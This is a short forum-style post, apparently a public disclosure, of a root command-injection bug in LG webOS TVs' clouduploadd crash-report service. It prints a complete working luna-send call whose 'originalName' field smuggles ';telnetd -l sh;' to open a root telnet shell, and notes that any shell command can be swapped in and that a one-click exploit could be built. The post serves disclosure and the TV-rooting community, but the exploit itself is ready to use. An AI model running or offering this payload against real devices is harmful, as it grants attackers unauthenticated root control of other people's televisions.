A Christmas gift from Santa  
Now that it's Christmas and LG has really had more than enough time and
opportunity to fix the following vulnerability (it's been known to them
for over 6 months), it's time to release some details on what is always
referred to here as the "crashd" method. In reality, it's a bug in
"clouduploadd", a process that spawns when a crash report is uploaded to
LG's servers. As a side note: This is why the EULAs must also be agreed
to for the exploit to work, because otherwise no uploads to LG's servers
will be made. I hope that the information is handled responsibly and
that it does not end up being used by criminals to make money or cause
damage. To execute a command with root rights, you actually do not need
LG's developer mode, nor do you need to store or manipulate any files on
the system. The following API call can be used to execute ANY shell
commands with root privileges:
    luna-send -d -n 1 -f "luna://com.webos.service.cloudupload/processCrashReport" '{ "detail": "", "reportFile": "/tmp/rdxd/crash", "format": "", "originalName": ";telnetd -l sh;", "sysinfo": "", "cause": "", "component": "", "time": "", "type": "crash"}'
You can replace telnetd -l sh with any other shell command. To execute
this API call, you can make use of LG's SSAPI, as various tools such as
bscpylgtv or ColorControl do. With this information, a "one-click"
exploit could practically be created, all the many steps described for
"crashd" would be unnecessary. Of course I could have published all this
in a different, more appropriate form, maybe I still will, but it's
Christmas right now and I feel more like giving something. Merry
Christmas to you all!  (edited)
